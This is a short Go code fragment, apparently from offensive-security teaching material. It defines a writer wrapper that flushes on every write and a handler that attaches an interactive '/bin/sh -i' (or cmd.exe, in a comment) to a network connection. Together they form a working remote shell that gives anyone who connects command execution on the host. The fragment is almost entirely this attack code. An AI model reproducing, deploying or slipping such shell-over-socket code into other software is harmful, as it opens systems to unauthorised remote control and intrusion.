// Flusher wraps bufio.Writer, explicitly flushing on all writes
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher {
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i") // Linux
	// cmd := exec.Command("cmd.exe") // Windows
	rp, wp := io.Pipe()
	// Data written to writer (wp) will be read by reader (rp)
	cmd.Stdin = conn
	cmd.Stdout = wp // Assign writer
	go io.Copy(conn, rp) // link PipeReader to TCP connection
	cmd.Run()
	conn.Close()
}